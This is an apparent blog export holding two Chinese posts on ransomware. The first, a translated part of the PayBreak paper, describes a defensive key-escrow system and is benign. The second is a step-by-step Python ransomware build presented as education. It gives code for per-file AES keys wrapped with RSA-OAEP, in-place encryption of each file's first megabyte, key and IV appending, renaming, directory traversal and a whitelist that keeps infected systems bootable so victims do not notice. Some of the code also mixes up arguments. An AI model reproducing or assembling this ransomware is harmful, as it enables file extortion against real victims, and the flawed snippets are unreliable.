Robustness为了识别静态链接的加密库，PayBreak依赖于签名。因此，一个明显的问题是这些签名对混淆的鲁棒性。与所有实用的在线反恶意软件免杀方案一样，足够级别的混淆和欺骗可以规避PayBreak提供的保护。但是，请注意，运行时脱壳的二进制文件不会对PayBreak造成问题。为了评估签名的鲁棒性，我们根据不同编译器和优化级别引入的语法更改来评估它们，因为攻击者可以轻松更改这些特征。为此，我们编译了12个程序，这些程序使用具有不同编译器和优化设置的Crypto++加密库。更准确地说，我们的示例程序静态链接了Crypto++版本5.6.3、5.6.2和5.6.1，包含了这个流行的Windows加密库开发的五年时间。此外，我们使用tdm-gcc和mingw32-gcc编译器编译了程序，每个编译器都具有禁用的优化功能和最大优化级别。要识别加密功能的所有12个变体，我们必须开发两个签名。原因是，使用不同的编译器时，工件之间的差异很大，但对于不同的优化级别，差异就较小。本质上，我们必须为每个编译器创建一个签名，并且每个签名在所有经过测试的优化级别和库版本中都是可靠的。 File RecoveryPayBreak能够从十二个软件中完全恢复加密文件。由于我们正在处理大量样本，因此我们的RADDAR系统只会执行每个样本20分钟。但是，为了评估性能和恢复整个文件系统的能力，我们在可重置的测试环境中执行了四个勒索软件系列，每个系列运行了四个小时。为了开发此测试环境，首先，我们在整个虚拟机的整个文件系统中随机分布于标准化文档库Govdocs1线程。文档语料库包含9,876个文件，这些文件主要是常见的办公类型，例如.xls，.docx和.pdf。对于每个文件，我们记录其原始SHA1文件哈希。通过比较这些文件哈希，我们可以确定我们恢复的文件是否为原始文件。然后，我们执行了一个勒索软件家族，并在没有干预的情况下运行了四个小时。感染完成后，我们将系统上的所有文件提取到安全的环境中。 PayBreak尝试使用从系统中提取的密钥保险库恢复这些文件。然后，我们重置虚拟机，并对每个系列重复此过程。 在对文件系统进行勒索软件加密之后，我们执行了PayBreak解密。我们的系统能够从每种攻击中恢复100％的原始加密文件。与先前生成的原始文件哈希值进行比较对于恢复不是必需的，使用先前生成的文件哈希值仅可作为成功文件恢复的确认。 Locky样本对9,821个文件进行了加密，并在360m40s内恢复了文件。 Cryptowall样本对文档语料库中的204个文件进行了加密，并在86s内恢复了文件。AlmaLocker样本对我们文档语料库中的271个文件进行了加密，而受影响的文件在26s内被恢复。Cryptowall和Alma Locker样本对少量文件进行了加密，可能是由于恶意软件的不稳定性所致，即它们在执行过程中崩溃了；但是，尽管如此，这些测试证明PayBreak能够在短时间内，即整个文件系统几小时的规模内，从勒索软件攻击中完全恢复所有文件。 Performance Impacts在本节中，我们回答RQ3，它评估了PayBreak对性能的影响。 对于这个问题，我们对两个特征感兴趣。PayBreak对单个调用加密API（即微型基准）会造成何种放缓，以及在常规办公室工作负载（即宏基准）期间对加密API的调用频率如何。 我们评估了运行Windows 7 32位虚拟机，2GB RAM和2个2.20GHz CPU内核的一般笔记本电脑的性能。 Micro benchmark为了衡量使用Detours hook的CryptoAPI函数的系统开销，我们在1KB文件上执行了1000万次CryptEncrypt API调用的微基准测试。我们发现在没有hook的情况下花费了4.02s。启用PayBreak，将会话密钥和加密方案信息导出到密钥库后，加密循环花费了1,242s。 因此，平均一次对CryptEncrypt API的调用要花费124µs（即速度降低310倍）。但是，大多数性能影响来自写入密钥库的I / O操作。 从测量中省略磁盘I / O可使速度降低到1.5倍。因此，PayBreak的简单性能优化可以是在专用 I/O 线程中执行对密钥库的写入操作，实际的工作负载比上面讨论的综合最坏情况基准遭受的性能影响要小得多。 Macro benchmark尽管对加密API的单个调用的相对性能影响很大，但是在常规办公室工作负载中这种操作极为罕见。 对于我们的宏基准测试，我们在配备PayBreak的虚拟机上使用了常见的Windows软件。 我们执行的Windows软件包括：7zip，AVG，Dropbox，Firefox，Gimp 2，Google Chrome，Google Drive，Internet Explorer（IE），iTunes，KeePass 2，LibreOffice，Microsoft Excel，Microsoft Powerpoint，Microsoft Word，Pidgin，Putty， RealVNC，Skype，SumatraPDF，WinSCP，WinZip。 由于篇幅所限，我们无法针对我们测试的每个应用程序完整分析我们的测试程序。但是，我们提供了对五个应用程序分析的报告。我们发现任何应用程序都没有明显的速度下降，并且常规应用程序使用期间平均少于100个加密API调用。每个应用程序名称后面的括号中的数字是我们在测试期间从应用程序记录的CryptoAPI调用的数量。 KeePass 2 (28)我们创建了一个新的密码数据库，并使用该应用程序随机生成了3个密码。 我们删除了该数据库，并创建了一个新的空数据库。 然后，我们导入了一个旧数据库。 我们注意到任何这些操作都没有变慢，并且该应用程序完全正常工作。 KeePass 2似乎是CryptoAPI的不同用户，因为我们观察到CryptoAPI被调用的六个不同功能。 Dropbox (127)我们使用该程序登录了一个Dropbox帐户。然后，我们将该帐户中先前存放在本地计算机上的3个文件同步。然后，通过将文件拖到Dropbox文件夹中，将5个文件从本地计算机同步到云中。 我们注意到同步期间没有速度下降，也没有程序崩溃。在我们的测试期间，Dropbox进行的大多数CryptoAPI调用都是针对CryptGenRandom的。 Putty (2)我们连接了远程SSH服务器并执行了几个命令，随后与服务器断开连接。 此应用程序并不频繁调用CryptoAPI，我们没有发现速度变慢或程序不稳定的情况。 Skype (19,418)我们创建了一个Skype帐户， 添加了2个联系人并发送了消息。 然后，我们给这些联系人中的1个打电话。 Skype频繁调用CryptoAPI，比我们观察到的任何其他程序都要多。 但是，即使使用率如此之高，也远远超过任何其他程序，我们也没有发现速度减慢或程序不稳定。 Internet Explorer (3,328)我们使用AutoIt程序来实现IE自动化，从而在其HTTPS主页上访问Alexa最受欢迎的100个网站。我们在每个页面上停留5秒钟以让页面完全加载。我们发现每个网页（包括所有资源）平均对CryptoAPI调用33次。因此，即使每次加密操作未优化的减慢速度为124µs，这也导致页面加载的开销仅为4.1ms，明显低于人类的感知阈值。 讨论和系统限制在本节中，我们将讨论尽管我们的系统存在或由于我们的系统而存在的挑战、开放性问题和限制。一个微不足道的，看似有效的防御勒索软件是一个可靠的备份。有了这样一个备份，用户就不用担心勒索软件的攻击了，恢复所需的只是擦除并重新安装受感染的计算机，并从备份中恢复数据。虽然很简单，但显然过去成为勒索软件受害者并支付赎金的用户并没有这种简单的机制。不幸的是，让所有用户全面使用备份似乎是不现实的。 此外，据报道，一些最近的勒索软件系列（例如RansomWeb或CryptoWall）在感染后立即加密文件，并通过在访问时透明地解密数据来在有限的时间段（例如几个月）内提供对数据的访问权限。 一旦此初始期限到期，恶意软件就会破坏解密所需的密钥，并要求勒索。在这一点上，自感染以来（假如只有几个月）进行的所有备份仅包含加密数据，因此无法从感染中恢复。 PayBreak的核心是一个关键托管系统。政府提出并强制要求的密钥代管制度一直受到研究界和隐私权倡导者的批判。我们完全赞同这一观点，并强烈反对政府规定的密钥代管制度。但是，此类政府强制性提案与PayBreak之间存在根本差异。在PayBreak中，仅存在一个有权访问保存在密钥库中的密钥的实体-合法用户自己。也就是说，除了用户本人之外，没有可信任的第三方。 我们的PayBreak原型实现使用多个动态或静态链接的库来击败勒索软件。勒索软件的作者可能会为了破解PayBreak而尝试推出自己的密码库。但是，这通常会导致软件的失败（例如，僵尸网络管理员使用的简单加密使他们的C＆C协议易于逆向），因此勒索软件作者更倾向于利用安全的第三方库。但是，安全的加密库很少，只有有限的一些可供选择。而对于我们的系统来说，为第三方库或自定义库创建签名并没有难度。我们使用三种不同的库的测试经验表明，可以轻松快速地添加对更多库的支持。例如，我们开发了在一天之内检测Crypto++所需的签名。此外，我们的原型还hook了Windows标准的CSPRNG函数 CryptGenRandom。通过动态hooking并记录该系统功能，PayBreak可以利用任何其他勒索软件库存储任何勒索软件使用的会话密钥的基础资料。无论使用什么代码，恶意软件分析人员只需识别一次加密实现，并将其添加到PayBreak即可添加支持。识别密码不必是手工的，相反，可以通过多种方式使该过程自动化。一旦识别出密码，便存在大量有助于识别相似代码的工作。为了完全避开对称密钥的使用，勒索软件的作者可能会倾向于使用完全非对称的原语来加密数据。尽管这种策略是可行的，但可以通过监视这些方面的启发式方法来解决高资源需求和非对称加密异常频繁地使用的问题。尽管PayBreak表现出了对当代加密勒索软件的有效性，但实际部署仍必须解决本文未涉及的几个问题。这些问题包括，例如，用户如何保护私钥的安全，或为密钥库实施安全的轮转系统，以防止库的无限增长。 如前所述，PayBreak能够在几小时内从勒索软件攻击中恢复，通过详尽搜索，文件恢复独立于勒索软件。这种详尽的搜索是一种并行的工作负载，因此可以使用其他计算资源（例如云部署）几乎任意地进行优化。此外，需要从勒索软件感染中恢复应该是一种罕见的特定情况。 我们认为，对于常规的勒索软件受害者而言，与可恢复加密文件的速度相比，重新获得对加密数据的访问更为重要。 我们承认，与大部分实用的在线保护系统一样，混淆和加壳可以破坏PayBreak提供的保护。但是，混淆只是静态链接到加密库的恶意软件的关注点。由于使用PayBreak会在未混淆的系统DLL中挂钩API函数的实现，因此不会受到使用系统提供的CryptoAPI的恶意软件的绕过。此外，正如我们的评估所示，PayBreak完全能够保护用户免受静态链接加密库的恶意软件的侵害，只要该恶意软件被现代加壳程序所混淆即可。实际上，所有用于评估的恶意软件样本都已加壳，而且来自Tox家族的样本静态链接了Crypto++库。多年来，学术文献和商业资源已提供了高级混淆器。但是，这些先进技术并未在整个恶意软件生态系统中广泛使用。例如，Sun[6]报告说，在103,392个分析的样本中，有91％仅使用简单的加壳软件（例如UPX或ASPack），这些壳不会绕过PayBreak提供的保护。不幸的是，我们不知道阻止恶意软件作者广泛使用更高级的混淆技术的原因，因此，PayBreak提高了恶意软件作者的门槛，并迫使他们使用迄今为止他们一直拒绝采用的绕过技术。 恶意软件可以实施的另一种绕过PayBreak的方法即检测到受害者的计算机中是否正在运行PayBreak，并因此跳过插入的hook。但是，没有理由PayBreak必须在目标加密功能的开头安装hook。只要相关数据结构（例如密钥和加密方案参数）仍在使用范围内，我们可以修改PayBreak以将hook插入函数中的任意点。与混淆情形类似，PayBreak无法提供针对专门旨在绕过PayBreak的恶意软件的保证，但是PayBreak可以大大减少攻击者成功的几率。 最后，发现PayBreak存在的勒索软件可以通过破坏用于在保管库中保管数据的公钥或简单地用无意义的信息填充保管库来发起DOS攻击。可以将PayBreak修改为具有附加到Vault的特权（如以SYSTEM身份运行）进程，从而保护公钥的完整性。在对受害者的文件进行加密之前，使文件库充满垃圾的攻击只能增加恢复加密文件所需的时间，上面提到的特权进程也可以检测到这种攻击的进行，并向用户发出警报，或者终止有问题的过程。即使这种攻击没有引起警报，请回想一下，感染勒索软件是一种罕见的情况，而识别正确的密钥和加密偏移量则很尴尬。因此，即使使用大型保管库（一个1TB的保管库可以容纳大约170亿个条目），恢复也只会被延迟，而不能阻止。 总结PayBreak是一种创新的保护机制，可以解决基于加密的勒索软件的威胁。早期的勒索软件系列由于未正确配置加密模式而失败，因而成功的软件转而使用正确的加密方法——混合加密。我们研究确定了大部分的勒索软件都必须在受害者的主机上使用对称会话密钥来执行文件加密，因此PayBreak实现了密钥托管机制，将会话密钥存储在密钥库中并使用用户的公共密钥加密，只有用户的私钥才能解锁该密钥库。与政府强制的密钥托管系统相反，PayBreak确保只有合法用户才能访问托管的密钥。我们对107个勒索软件样本进行了测试，并证明PayBreak可以成功地从十二种不同勒索软件系列所造成的损害中恢复，同时其运行时开销远远低于人类的感知阈值，因此可以在日常工作环境钟使用PayBreak。最后，PayBreak将作为一个公开可用的开源项目发布[7]。 参考勒索软件结构与加密模式研究 ↩P. Lestringant, F. Guih´ery, and P.-A. Fouque. Automated identification of cryptographic primitives in binary code with data flow graph isomorphism. In Proceedings of the 10th ACM Symposium on Information, Computer and Communications Security, ASIA CCS ’15, 2015. ↩Cryptographic Message Syntax (CMS) ↩Fine Free File Command ↩A. Kharraz, W. Robertson, D. Balzarotti, L. Bilge, and E. Kirda. Cutting the Gordian Knot: A Look Under the Hood of Ransomware Attacks. In Proceedings of the International Conference on Detection of Intrusions and Malware, and Vulnerability Assessment (DIMVA), volume 9148 of Lecture Notes in Computer Science, Milan, Italy, July 2015. Springer International Publishing. ↩L. Sun. Reform: A framework for malware packer analysis using information theory and statistical methods, 2010. ↩https://github.com/BUseclab/paybreak ↩","categories":[],"tags":[{"name":"勒索软件","slug":"勒索软件","permalink":"https://mundi-xu.github.io/tags/%E5%8B%92%E7%B4%A2%E8%BD%AF%E4%BB%B6/"},{"name":"恶意软件","slug":"恶意软件","permalink":"https://mundi-xu.github.io/tags/%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6/"},{"name":"Hybrid Cryptosystem","slug":"Hybrid-Cryptosystem","permalink":"https://mundi-xu.github.io/tags/Hybrid-Cryptosystem/"},{"name":"密钥存储库","slug":"密钥存储库","permalink":"https://mundi-xu.github.io/tags/%E5%AF%86%E9%92%A5%E5%AD%98%E5%82%A8%E5%BA%93/"},{"name":"Windows Hooking","slug":"Windows-Hooking","permalink":"https://mundi-xu.github.io/tags/Windows-Hooking/"}]},{"title":"勒索软件结构与加密模式研究","slug":"勒索软件结构与加密模式研究","date":"2020-12-28T07:14:10.000Z","updated":"2021-01-01T14:41:17.901Z","comments":true,"path":"2020/12/28/勒索软件结构与加密模式研究/","link":"","permalink":"https://mundi-xu.github.io/2020/12/28/%E5%8B%92%E7%B4%A2%E8%BD%AF%E4%BB%B6%E7%BB%93%E6%9E%84%E4%B8%8E%E5%8A%A0%E5%AF%86%E6%A8%A1%E5%BC%8F%E7%A0%94%E7%A9%B6/","excerpt":"对常见勒索软件的架构与攻击模式的研究。","text":"One of the best ways of learning how something truly works is to try to build it yourself. 本文的目的仅为分享有关勒索软件恶意软件的知识，任何人不得将其用于恶意目的。 基本加密类型在对勒索软件的研究中最重要的概念之一就是它使用的加密类型，其中主流勒索软件均使用以下两种，具体可参阅密码学相关文献。 对称加密 对称加密是大多数人都熟悉的加密技术，其使用同一个密钥来加密或解密数据，常用于zip文件或Office文档之类的加密。 非对称加密 非对称加密的具体实现可能较为难以理解，但其应用还是简明易懂的。 非对称加密算法需要两个密钥：公开密钥（publickey:简称公钥）和私有密钥（privatekey:简称私钥）。公钥与私钥是一对，如果用公钥对数据进行加密，只有用对应的私钥才能解密。因为加密和解密使用的是两个不同的密钥，所以这种算法叫作非对称加密算法。 非对称加密算法实现机密信息交换的基本过程是：甲方生成一对密钥并将公钥公开，需要向甲方发送信息的其他角色(乙方)使用该密钥(甲方的公钥)对机密信息进行加密后再发送给甲方；甲方再用自己私钥对加密后的信息进行解密。甲方想要回复乙方时正好相反，使用乙方的公钥对数据进行加密，同理，乙方使用自己的私钥来进行解密。 另一方面，甲方可以使用自己的私钥对机密信息进行签名后再发送给乙方；乙方再用甲方的公钥对甲方发送回来的数据进行验签。其目的不是为了保密，而是证明您是发送该消息的人（就像签名在现实生活中一样有效）。甲方只能用其私钥解密由其公钥加密后的任何信息。非对称加密算法的保密性比较好，它消除了最终用户交换密钥的需要。 勒索软件相关应用让我们考虑一下正常情况下被勒索软件感染的流程。其payload通过多种方式（钓鱼，软件漏洞等）传播，并在目标计算机上运行从而加密目标的所有文件。之后，用弹窗或其他醒目的方式要求受害者交钱以获取解密文件的方法。所以我们应该怎样才能做到这些呢？ 我们的第一个反应肯定是对文件使用对称加密，但这是错误的，并且任何一个正常的勒索软件都会出于一个重要原因而避免这样做。当勒索软件正在加密受害者的文件时，加密密钥将需要出现在某个地方。如果使用对称加密，则用于加密的加密密钥也可以用于解密。这意味着合格的取证专家可以恢复感染期间用于加密的密钥，然后使用它来解密文件。当使用非对称加密时，我们使用不同的密钥进行加密和解密，因此，只要确保解密密钥的安全，即使在受害者计算机中存储加密密钥也不是什么大问题。 我们需要考虑的另一件重要事情是，作为攻击者，我们需要拥有密钥，以便受害者决定支付赎金时解密文件。使用对称加密时，我们需要在二进制代码上对密钥进行硬编码（而这有多种方法可以逆转），或者即时生成它，然后使用某种方式将其传输到攻击者的服务器（这也是一个坏主意，因为它可能在传输过程中被截获，并且如果目标计算机断网，因为没有密钥，我们将无法为受害者解密文件。）像这样的方案曾在CryptoDefense的第一代产品中使用，并允许受害者自行解密文件[1]。因为密钥既在生成后传输到服务器，缺又意外的留在了本地文件系统中。 而这就意味着我们必须使用非对称加密来加密受害者文件吗？我们可以生成一个密钥对，在代码上对公共密钥进行硬编码，然后用该密钥对所有内容进行加密（将私有密钥妥善保存）？不，我们不能。 当您尝试这么干时，一个显而易见的原因就是非对称加密比对称加密要慢几个数量级。当您加密受害者的硬盘时，您需要尽快加密所有内容。如果完全加密文件需要要花费几分钟以上，那么受害者可能会注意到其文件已被加密，而这时只需简单的关闭计算机即可。这将使他能够从硬盘驱动器中保护剩余的文件。 那么我们应该使用什么呢？ 混合加密 为了解决此问题，我们可以使用混合方法。当生成payload时，我们还将生成与该payload相关联的一组公用/专用密钥。我们在该特定payload中对​​公钥进行编码，并且每当发生感染时，payload都会生成一个用于对称加密的密钥。加密后，我们使用硬编码的公钥对对称密钥进行加密（当然，明文存储的对称密钥会从内存/磁盘中销毁）。这个加密的对称密钥被保存在机器上的某个地方，并在赎金记录中要求受害者提供此密钥。 但是我们还有另一个问题。 密钥复用和选择明文攻击选择明文攻击：攻击者在开始攻击时可以选择一些明文，并获取加密后的密文。如果攻击者在攻击中途可以根据已经获取的信息选择新的明文并获取对应的密文，则称为适应性选择明文攻击。其是一种加密攻击，其中，攻击者在加密之前就知道了明文，并给出了足够大的加密文件样本，从理论上讲，密钥可以从加密结果中得出。大多数文件的header（具有已知格式）都可能发生这种情况。如果我们在给定条件的情况下对所有文件使用相同的密钥，则理论上可以恢复该密钥。这实际上正是DirCrypt发生的事情[2]。其由于不合适的密码实现和密钥复用，加密过程被逆转了。 我们可以通过为每个文件使用不同的密钥来解决此问题。我们可以为每个文件生成对称密钥来对文件进行加密，同时使用payload中的公共密钥加密密钥，将加密的对称密钥写入某个位置，然后删除明文对称密钥。 许多勒索软件都使用这种方法，在这种加密模式中，它们生成一个文本文件，其中包含每个加密的文件名和与其关联的加密的公共密钥。使用解密工具时，它将读取文本文件，使用私钥解密每个密钥，然后使用解密后的密钥解密文本文件。但我们将使用一些不同的东西。 技术说明：这种类型的攻击实际上并不影响我们将使用的对称加密密码（AES-256），因为默认情况下，它对每个文件流使用不同的随机初始化矢量（IV），但我想解释一下这个适用于所有勒索软件的概念。如果勒索软件的开发人员犯了一个错误，这可能会帮助您恢复数据。实际上，这种攻击实际上可能会影响RSA加密，因为它的最基本形式不是随机的。但在我们的情况下，这将不是问题，因为我们使用RSA加密的唯一文件是AES加密密钥，并且它们既不构成要分析的大样本也不是同类样本，并且我们将使用RSA加上最佳非对称加密填充，可为加密增加随机性。 对每个文件使用不同的密钥的另一个优点是可以在加密每个文件后删除该加密密钥，因此，如果任何受害者试图恢复该密钥，他将只能恢复用于最后一个文件加密的密钥。如果我们对所有文件使用相同的密钥，则可以在加密过程的任何部分中恢复密钥，并且所有文件都是可恢复的。 加密速度在对勒索软件进行编译时，原始版本使用了我到目前为止所介绍的所有功能，但结果有些令人失望。当使用32位密钥（AES-256）时，初始基准测试显示加密速度约为每分钟1GB。当然，这种速度在很大程度上取决于受害者的硬件，而我使用的是VM，因为我不想意外地加密我的开发计算机，但是花16分钟的时间来加密一个简单的1TB硬盘显然并不合适。 那么，现代的勒索软件是如何在几秒钟内加密几千兆字节的信息的？答案在于文件结构。 实际上对正常操作系统而言，并不需要加密整个文件即可使其不可用。根据文件格式，对header和前几个字节进行加密就足以使整个文件不可读。我们可能可以加密每个文件的前5兆字节。当然，使用诸如strings之类的东西仍然可以读取诸如txt / ascii文件之类的简单文件，但是大多数情况下，这些文件的权重不会超过几个kb。此外，受害者最珍贵的文件通常是文档，图片和视频。即使您仍然可以尝试对部分文件进行取证分析并恢复某些内容，但这是一种手动方法，需要对每个单独的文件进行操作，这一点都不实用。 更改文件的结尾的想法也很好，我们可以通过在结尾处添加几个特定结构来利用这一点。 初始化向量：使用AES加密文件时，您需要一种称为初始化向量的东西。这是在加密过程开始时生成的。 加密解密密钥：我们还可以将加密解密的密钥附加到每个文件的末尾，这将不用存储每个文件的解密密钥。 加密的文件结构最终将变成如下所示： 只加密文件的一部分的另一个优点是它允许我们处理同一文件而不是生成新的加密文件并删除旧文件，而这在边界情况下很有用。在这种情况下，我们有权写入现有文件，但不能创建新文件，它还允许我们快速处理非常大的文件（类似500G的MySQL数据库）。 整体架构为每个进程选择适当的加密方式后，我们将需要设计整体架构来传播此恶意软件，这将涉及自动为每个payload创建一组密钥的过程，因为我们不希望所有受害者共享同一密钥（如果一个人支付了赎金，它可以分发密钥，从而使每个人都可以解密他们的加密文件）。我们还需要保留与每个受害者关联的密钥的数据库。 为单个payload生成非对称密钥可以使用以下ssh-keygen命令： 1ssh-keygen -b 2048 -m pem -f pem 开发语言选择只要您避免使用特定于操作系统的指令（例如用os.system调用的指令），即跨平台的同时速度也要很快（rust），并且具有我们需要执行的大多数加密操作的库。最后，它最好允许混淆编译后的代码，这样能使最终二进制文件的逆向更加困难。这里我们选择了python(显而易见？)。 在选择python库时，我们可能会导入多种看上去功能相同的库，这是为了选择其中最有效的一个，特别是在密码学这种不断变化的领域。毕竟，过时的加密库或者自建的加密方案可能会导致软件的漏洞[3]。我们将使用两个知名的python库：pycryptodome和secrets。 实际上，可以使用asymcrypt。但是，我将使用直接的pycryptodome并创建每个函数来更好地说明概念。 主要函数 generate32ByteKey() ：生成一个随机的32字节密钥,有多种方法可以做到这一点。可以从/dev/urandom抓取一个字符串并对其进行sha256sum运算，但这用于linux，而我们希望软件跨平台，因此我们将使用python的secrets库，通过secrets.token_hex(32)完成。 rsaEncryptSecret(string，publicKey)：使用公钥非对称加密信息（因此只能使用私钥解密）。这将使我们能够使用publicKey加密每个文件的对称密钥。客户端将使用我们的privateKey解密每个文件的对称密钥，然后使用其自己的对称密钥解密每个文件。 saDecryptSecret(secret, privateKey)：使用私钥解密加密的对称密钥。 symEncryptFile(publicKey, file)：此函数是最复杂的函数，其含有具体的加密逻辑，后文将进行进一步说明。但顾名思义，它用于加密文件。 symDecryptFile(privateKey, file)：解密文件。 symEncryptDirectory(publicKey, dir)：此函数接收目录作为参数，并遍历目录以获取其中的所有文件。之后，它将使用publicKey调用symEncryptFile。 symDecryptDirectory(privateKey, dir)：与symEncryptDirectory类似，顾名思义。。。 rsaEncryptSecret 使用RSA加密密钥，但RSA在默认情况下不会进行任何随机加密，因此我们将使用最佳非对称加密填充（简称OAEP）。这是一种填充方案，可通过添加随机性和单向置换陷门来改进RSA。需要注意的是，当RSA与OAEP一起使用时，所得的密码大小应与模数相同。模数是密钥大小/8，我们使用的是2048位RSA，因此生成的密文应为256字节。 简单示例： 1234567891011def rsaEncryptSecret(string, publicKey): public_key = get_key(publicKey, None) # Create the cipher object cipher_rsa = PKCS1_OAEP.new(public_key) # We need to encode the string to work with bytes instead of chars bytestrings = str.encode(string) cipher_text = cipher_rsa.encrypt(bytestrings) #At this point the cipher_text should be 256 bytes in length # We&#x27;ll base64 encode it for convenience # Remember that a base64 string needs to be divisible by 3, so 256 bytes will become 258 with padding return base64.b64encode(cipher_text) RsaDecryptSecret使用给定的私钥解密密文： 123456789101112def rsaDecryptSecret(string, privateKey): # We firts import the private Key private_key = get_key(privateKey, None) # Decode the base64 encoded string base64DecodedSecret = base64.b64decode(string) # create the cipher object cipher_rsa = PKCS1_OAEP.new(private_key) # Decrypt the content decryptedBytestrings = cipher_rsa.decrypt(base64DecodedSecret) # Remember to convert the decoded cipher from bytes to string decryptedSecret = decryptedBytestrings.decode() return decryptedSecret SymEncryptFile这是主要的加密函数。工作流程如下： 使用publicKey和文件路径作为参数调用该函数 1def symEncryptFile(publicKey，file): 为指定文件生成一个随机密钥 1key = generateKey() 使用publicKey加密随机密钥 1encriptedKey = rsaEncryptSecret(key，publicKey) 定义文件的加密大小（n个字节）。 1buffer_size = 1048576 检查文件是否加密，如已加密，跳过 123if file.endswith(&quot;.&quot; + cryptoName): print(&#x27;File is already encrypted, skipping&#x27;)return 加密文件的前n个字节并覆盖其内容 123456789101112# Open the input and output filesinput_file = open(file, &#x27;r+b&#x27;)print(&quot;Encrypting file: &quot;+ file)output_file = open(file + &#x27;.&#x27; + cryptoName, &#x27;w+b&#x27;)# Create the cipher object and encrypt the datacipher_encrypt = AES.new(key, AES.MODE_CFB)# Encrypt file firstinput_file.seek(0)buffer = input_file.read(buffer_size)ciphered_bytes = cipher_encrypt.encrypt(buffer)input_file.seek(0)input_file.write(ciphered_bytes) 将加密用的随机密钥添加到文件末尾 12input_file.seek(0, os.SEEK_END)input_file.write(encriptedKey.encode()) 在文件末尾附加AES IV（初始化向量） 12input_file.seek(0, os.SEEK_END)input_file.write(cipher_encrypt.iv) 重命名文件 12input_file.close()os.rename(file, file + &quot;.&quot; + cryptoName) 需要注意的是我们并不需要复制完整的文件，我们只是在文件上使用了seek()来定位字节并使过程尽可能快。这也将在解密功能中使用。 还要注意，由于我们在加密文件中同时写入了AES IV和加密密钥，因此我们不需要任何带有每个加密文件索引的txt文件。受害者可以向我们发送任何文件，只要我们拥有用于特定二进制文件的私钥，我们就可以对其解密。 SymDecryptFile这是主要的解密函数。工作流程如下： 使用privateKey和文件路径作为参数调用该函数 1def symDecryptFile(privateKey, file): 定义文件的解密大小（n个字节）（等于加密中使用的大小） 1buffer_size = 1048576 验证文件是否已加密（带有扩展名） 123456if file.endswith(&quot;.&quot; + cryptoName): out_filename = file[:-(len(cryptoName) + 1)] print(&quot;Decrypting file: &quot; + file)else: print(&#x27;File is not encrypted&#x27;) return 打开文件并读取AES IV（最后16个字节） 1234input_file = open(file, &#x27;r+b&#x27;)# Read in the ivinput_file.seek(-16, os.SEEK_END)iv = input_file.read(16) 读取加密的解密密钥 12345# we move the pointer to 274 bytes before the end of file# (258 bytes of the encryption key + 16 of the AES IV)input_file.seek(-274, os.SEEK_END)# And we read the 258 bytes of the keysecret = input_file.read(258) 使用提供的私钥解密加密的密钥 1key = rsaDecryptSecret(cert, secret) 解密我们之前定义的aes加密的缓冲区大小，并将其写入文件的开头 12345678910# Create the cipher objectcipher_encrypt = AES.new(privateKey, AES.MODE_CFB, iv=iv) # Read the encrypted header input_file.seek(0) buffer = input_file.read(buffer_size)# Decrypt the header with the keydecrypted_bytes = cipher_encrypt.decrypt(buffer) # Write the decrypted text on the same fileinput_file.seek(0)input_file.write(decrypted_bytes) 从文件末尾删除iv和加密密钥并重命名 123456# Delete the last 274 bytes from the IV + key. input_file.seek(-274, os.SEEK_END) input_file.truncate() input_file.close() # Rename the file to delete the encrypted extension os.rename(file, out_filename) 总结使用上述函数，我们就可以获得想要的最终二进制文件了。如果正确编译了symEncryptDirectory / symDecryptDirectory，则可以选择对参数中的文件夹/文件进行加密或解密，然后仅传递.pem文件。程序的参数选择大致如下： 1234567parser = argparse.ArgumentParser()parser.add_argument(&quot;--dest&quot;, &quot;-d&quot;, help=&quot;File or directory to encrypt/decrypt&quot;, dest=&quot;destination&quot;, default=&quot;none&quot;, required=True)parser.add_argument(&quot;--action&quot;, &quot;-a&quot;, help=&quot;Action (encrypt/decrypt)&quot;, dest=&quot;action&quot;, required=True) parser.add_argument(&quot;--pem&quot;,&quot;-p&quot;, help=&quot;Public/Private key&quot;, dest=&quot;key&quot;, required=True) 除了缺少错误处理模块（检查encrypt操作是否具有作为参数传递的公钥，decrypt是否具有私钥等）之外，我们还必须定义各类操作系统的白名单。这步操作是为了使计算机“可用”但仍处于加密状态。如果您只是加密所有可见文件，则可能会： 使计算机无法使用，这将使受害者发现问题。 对所有内容进行加密后，系统将无法启动，并且用户将不知道自己遭到了勒索软件的攻击。 在Linux下，白名单类似于： 1whitelist = [&quot;/etc/ssh&quot;, &quot;/etc/pam.d&quot;, &quot;/etc/security/&quot;, &quot;/boot&quot;, &quot;/run&quot;, &quot;/usr&quot;, &quot;/snap&quot;, &quot;/var&quot;, &quot;/sys&quot;, &quot;/proc&quot;, &quot;/dev&quot;, &quot;/bin&quot;, &quot;/sbin&quot;, &quot;/lib&quot;, &quot;passwd&quot;, &quot;shadow&quot;, &quot;known_hosts&quot;, &quot;sshd_config&quot;, &quot;/home/sec/.viminfo&quot;, &#x27;/etc/crontab&#x27;, &quot;/etc/default/locale&quot;, &quot;/etc/environment&quot;] 其他形式的勒索软件（MBR加密）目前还存在其他类型的勒索软件，例如某些勒索软件感染了驱动器的主启动记录，而payload将加密文件系统的NTFS文件表，从而使磁盘无法使用。由于这类勒索软件只需要加密一小部分数据，因此这种方法非常快[5]。Petya勒索软件就是这种设计的一个很好的例子。但它有三个主要缺点： 即使操作系统无法启动，我们仍然可以通过取证分析来恢复文件。它们并不会被删除，只是在文件表中被取消引用。即使恶意软件在重新启动计算机后启动了原始数据的加密例程，只要受害者立即关闭计算机并取出磁盘，文件也有很大可能可以通过取证分析得到恢复。 大多数现代操作系统已迁移到GPT（GUID分区表），不再使用MBR[6]。 它严重依赖于文件系统，并且需要对其进行修改以考虑其他区别于NTFS的文件系统类型（如EXT3/EXT4，ZFS等）。 这种方法需要了解更多的底层技术知识，另外，这种方法也不是最常用的方法，本文的主要目的是更好地理解常见的勒索软件。 建议除了一些显而易见的建议（不要打开来自未知来源的文件，经常更新软件和系统，使用杀毒软件等）之外，最主要的预防技术就是备份，备份和备份。。。或许还有很多有关如何防止攻击的建议，但我认为最好的办法永远是拥有数据的脱机备份。 毕竟一个局域网内不是所有人都可以做到以上几点 Ps. 如果您已被感染，并且不需要立即恢复加密文件（家庭照片，视频等），那么可以尝试保留加密文件的副本。有时，勒索软件的开发人员要么退休（Shade，TeslaCrypt，HildaCrypt），要么被捕（CoinVault），甚至有时候会公开竞争对手的密钥（Petya vs Chimera），这些情况下解密的密钥都可能被公开，从而恢复文件。等等党永不为奴 参考https://www.computerworld.com/article/2489311/cryptodefense-ransomware-leaves-decryption-key-accessible.html ↩https://blog.checkpoint.com/2014/08/27/hacking-the-hacker/ ↩https://blog.malwarebytes.com/threat-analysis/2018/04/lockcrypt-ransomware/ 